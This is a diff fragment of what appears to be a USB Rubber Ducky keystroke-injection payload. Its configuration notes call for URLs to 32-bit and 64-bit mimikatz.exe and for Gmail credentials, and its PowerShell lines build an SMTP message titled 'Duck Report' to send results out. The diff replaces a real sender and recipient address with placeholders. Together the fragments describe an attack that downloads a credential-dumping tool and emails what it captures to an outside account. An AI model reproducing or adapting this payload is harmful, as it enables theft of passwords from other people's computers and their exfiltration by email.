@@ -9,6 +9,8 @@ please change these lines to something (keep the single quote):
 'url to 32bit mimikatz.exe'  
 'url to 64bit mimikatz.exe'  
 'gmailuser', 'gmail password'  
+'sending email account'  
+'email account to send report'  
 
 
 Sorry about the wacky delays!  
@@ -63,9 +65,9 @@ STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('gmailuse
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'pesce@pescetech.com'
+STRING $ReportEmail.From = 'sending email account'
 ENTER
-STRING $ReportEmail.To.Add('pesce@pescetech.com')
+STRING $ReportEmail.To.Add('email account to send report')
 ENTER
 STRING $ReportEmail.Subject = 'Duck Report'
 ENTER
